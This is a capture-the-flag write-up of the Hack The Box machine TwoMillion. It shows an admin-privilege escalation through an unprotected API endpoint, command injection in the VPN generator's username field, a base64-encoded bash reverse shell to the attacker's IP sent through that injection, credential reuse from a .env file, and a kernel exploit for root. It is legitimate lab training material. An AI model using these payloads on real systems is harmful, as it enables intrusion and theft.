# HTB Walkthrough — Machine: TwoMillion

**Target IP:** 10.10.11.221  
**Author:** Miguel Reis
**Date:** 12/09/2025
**OS**: Linux

---
## 1. Initial Scan

With an initial scan we identify 2 open ports:
- `22` running OpenSSH 
- `80` running an nginx

```bash
nmap -sV 10.10.11.221
```

![[TwoMillion-20250911212831.png]]

To be able to access the webpage we need to add it to our `/etc/hosts` file.

---
## 2. Website Enumeration

Navigating to the webpage we face what appears to be an older version of the HackTheBox platform, from my own knowledge it is pretty similar to the first days of the platform which we can explore in [Wayback Machine](http://web.archive.org/). 

![[TwoMillion-20250911213459.png]]

While exploring the page we find the version could date to the year 2017.
![[TwoMillion-20250911213537.png]]

We also have access to a login page and a joining page that invites us to hack our way inside the platform, just as previous versions of the platform.

While exploring the platform manually we run a directory search:

```bash
dirsearch -u "http://2million.htb/" -t 50 -w /usr/share/wordlists/dirb/big.txt
```
![[TwoMillion-20250911214411.png]]

From my research previous versions of register page doesn't exist so we navigate to this page:
![[TwoMillion-20250911215257.png]]

Trying to register we get a response that we need to get an invite code first. 

Going back to the `/invite` page we find that it loads a `.js` file:
![[TwoMillion-20250911222107.png]]

To better understand this file we can substitute `eval()` with `console.log()` on the code, and execute it in the browser console presenting us with:

```js
function verifyInviteCode(code)
	{var formData {"code":code};
	$.ajax({
		type:"POST",
		dataType:"json",
		data:formData,
		url:'/api/v1/invite/verify',
		success:function(response){console.log(response)},
		error:function(response){console.log(response)}})}
function makeInviteCode()
	{$.ajax({
		type:"POST",
		dataType:"json",
	url:'/api/v1/invite/how/to/generate',
	success:function(response){console.log(response)},
	error:function(response){console.log(response)}})}
```

---
## 3. Get the Invite Code

We can then call the endpoint specified in the `makeInviteCode` function or simply run it from the console:
![[TwoMillion-20250911223159.png]] 

The response gives us what appears to be an encrypted message specifying the encryption as `ROT13` (aka. Caesar Cipher)

> [!tip] ROT13
> This is a specific, popular version of the Caesar cipher where the letters are rotated by 13 places. Applying ROT13 twice will result in the original message, making it useful for simple obfuscation rather than strong encryption 

The decrypted message is the following:

>In order to generate the invite code, make a POST request to /api/v1/invite/generate

![[TwoMillion-20250911224547.png]]

The invite appears to be base64 encoded so we decode it using:

```bash
echo 'WVpIT04tSjMwVDEtUFpLOU8tU1NFR0I=' | base64 -d
```

With the code we can finally register and log into the platform. 

---
## 4. Platform Exploitation

After login we are presented with the home page:
![[TwoMillion-20250911225244.png]]

Exploring the platform we find many similarities to the current https://app.hackthebox.com platform, the page that draws our attention is the following:
![[TwoMillion-20250911230024.png]]

By clicking "**Connection Pack**" we download an `.ovpn` file similar to the file we use to connect to the current platform.

This file is obtained by calling the endpoint `http://2million.htb/api/v1/user/vpn/generate`

This could mean we have more API endpoints, that we could possible explore:
![[TwoMillion-20250911235618.png]]

We need to be logged in to access the resource so we add the cookie we got from logging in to the request:

```bash
curl -v http://2million.htb/api -b "PHPSESSID=iq47ftvnu375oi34vdf1ng6cdn"
```

or we can use our browser to navigate to the page.
![[TwoMillion-20250912000110.png]]

We find there is only `/v1`, if there were any other versions they would probably be visible here. Moving forward with our endpoint discovery we find the following:
![[TwoMillion-20250912000445.png]]

By issuing the command:

```bash
curl  http://2million.htb/api/v1/admin/auth -b "PHPSESSID=iq47ftvnu375oi34vdf1ng6cdn" -s | jq           
{
  "message": false
}
```

We know the cookie does not belong to an admin because it's our own cookie. We can try and explore the other admin endpoints using our cookie as well. The command:

```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate -b "PHPSESSID=iq47ftvnu375oi34vdf1ng6cdn" -v
```

Receives a response `401 Unauthorized` as expected

But surprisingly the endpoint `/api/v1/admin/settings/update` returns the following :

```bash
curl -X PUT http://2million.htb/api/v1/admin/settings/update -b "PHPSESSID=iq47ftvnu375oi34vdf1ng6cdn" -s | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Host 2million.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.221
*   Trying 10.10.11.221:80...
* Connected to 2million.htb (10.10.11.221) port 80
* using HTTP/1.x
> PUT /api/v1/admin/settings/update HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/8.15.0
> Accept: */*
> Cookie: PHPSESSID=iq47ftvnu375oi34vdf1ng6cdn
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx
< Date: Thu, 11 Sep 2025 23:16:21 GMT
< Content-Type: application/json
< Transfer-Encoding: chunked
< Connection: keep-alive
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< 
{ [64 bytes data]
100    53    0    53    0     0    508      0 --:--:-- --:--:-- --:--:--   514
* Connection #0 to host 2million.htb left intact
{
  "status": "danger",
  "message": "Invalid content type."
}

```

We do not receive an `401 Unauthorized` response as expected, this could mean the endpoint does not verify if we are admin to run the command. The `Invalid content type` message specifies we did not send the appropriate request. We already know the API replies in JSON so it can be expecting a request of the same type, we can test this with:

```bash
curl -X PUT http://2million.htb/api/v1/admin/settings/update -b "PHPSESSID=iq47ftvnu375oi34vdf1ng6cdn" -s -H "Content-Type: application/json" | jq
{
  "status": "danger",
  "message": "Missing parameter: email"
}
```

This  trigger a different error specifying the parameter `email` is missing. This means the endpoint requires that specific data is sent for a successful update.

```bash
curl -X PUT http://2million.htb/api/v1/admin/settings/update -b "PHPSESSID=iq47ftvnu375oi34vdf1ng6cdn" -s -H "Content-Type: application/json" -d '{"email":"test@test.com"}'| jq
{
  "status": "danger",
  "message": "Missing parameter: is_admin"
}
```
Following the same reasoning we try to add the required parameter in the request:

```bash
curl -X PUT http://2million.htb/api/v1/admin/settings/update -b "PHPSESSID=iq47ftvnu375oi34vdf1ng6cdn" -s -H "Content-Type: application/json" -d '{"email":"test@test.com","is_admin":1}'| jq
{
  "id": 17,
  "username": "test",
  "is_admin": 1
}  
```
This means we successfully changed our account to admin. We can check it by running:

```bash
curl -X GET http://2million.htb/api/v1/admin/auth -b "PHPSESSID=iq47ftvnu375oi34vdf1ng6cdn" -s | jq  
{
  "message": true
}
```

---

## 5. Exploitation

We can now generate a vpn file for a specific user using the `POST` method while previously as a normal user we could only `GET` our own as we can see in 
[[TwoMillion-20250912000445.png]]

We run the command:

```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate -b "PHPSESSID=iq47ftvnu375oi34vdf1ng6cdn" -s -H "Content-Type:application/json"| jq
{
  "status": "danger",
  "message": "Missing parameter: username"
}
```
As previous we must input the specified parameter, in this case it appears to be the username for the use we want to generate the vpn file for. We try a random username:

```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate -b "PHPSESSID=iq47ftvnu375oi34vdf1ng6cdn" -s -H "Content-Type:application/json" -d '{"username":"random"}'   
```

Successfully creating a vpn file it was printed for us. If the file is generated with a function and there is not filtering security in place, we could possibly be able to inject code into the machine. Let us try this hypothesis:

```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate -b "PHPSESSID=iq47ftvnu375oi34vdf1ng6cdn" -s -H "Content-Type:application/json" -d '{"username":"random;id;"}'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The command `id` was successfully run in the machine which means we have a command injection vulnerability in the endpoint. From this point we can run commands in the target, inspect files and also get a reverse shell

---

## 6. Reverse Shell

To get a reverse shell we grab this simple reverse shell and base64 encode it

```bash
echo 'bash -i >& /dev/tcp/10.10.14.217/8023 0>&1' | base64 -w 0;echo
```
After setting up our listener:

```bash
nc -nvlp 8023
```

We can run the command with:

```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate -b "PHPSESSID=iq47ftvnu375oi34vdf1ng6cdn" -s -H "Content-Type:application/json" -d '{"username":"random;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMTcvODAyMyAwPiYxCg== | base64 -d | bash;"}'
```

Successfully getting a reverse shell on our machine
![[TwoMillion-20250912012340.png]]

---

## 7. User Access

We found the .`env` file in the `/var/www/html` containing the environment variables of the PHP application we find credentials inside:
![[TwoMillion-20250912010838.png]]

Checking the `/etc/passwd` we confirm the user `admin` exists, we then try to ssh into the machine using the found credentials
![[TwoMillion-20250912012910.png]]

Successfully getting user access to the target!

---

## 8. Privilege Escalation

Exploring the target we find what appears to be an email sent to the `admin` user:
![[TwoMillion-20250912015733.png]]

Searching for the CVE mentioned we find [this](https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/) article that appears to match the description sent in the e-mail. It is worth a chance since the article mentions versions lower than `6.2` is likely to be vulnerable and our target has the version:

![[TwoMillion-20250912020022.png]]

Searching for an exploit for CVE-2023-0386 we found this repository:
https://github.com/sxlmnwb/CVE-2023-0386

---
## 9. Root Access

The first step is to clone the repository to our machine and compress it so it's easier to copy to our target

With the exploit in the target machine we unzip it, and follow the instructions to compile the code and run the exploit.

> [!Tip] Use a single terminal
> The authors suggest you use 2 terminals to run the exploit, we can run the first command in the background by adding `&` in the end of it, allowing us to run the second command in the same terminal session.

Successfully getting root access with the exploit
![[TwoMillion-20250912021032.png]]

---
## 🥚. Easter Egg

Inside the root folder we find a `thank_you.json` file, which appears to be URL encoded. We can use [CyberChef](https://gchq.github.io/CyberChef/) to decode the message. After decoding it the first time we see it is also hex encoded. Thankfully CyberChef allows us to stack functions to decode/decrypt data. Now we find it is base64 encoded and XOR encrypted with the `HackTheBox` encryption key. Finally we get to read the message:
![[TwoMillion-20250912022418.png]]

---
## 💭 Final Thoughts

This box was a great example of how insecure API authorization, command injection in the VPN generator, exposed application credentials, and an unpatched kernel could be chained together for a full system compromise.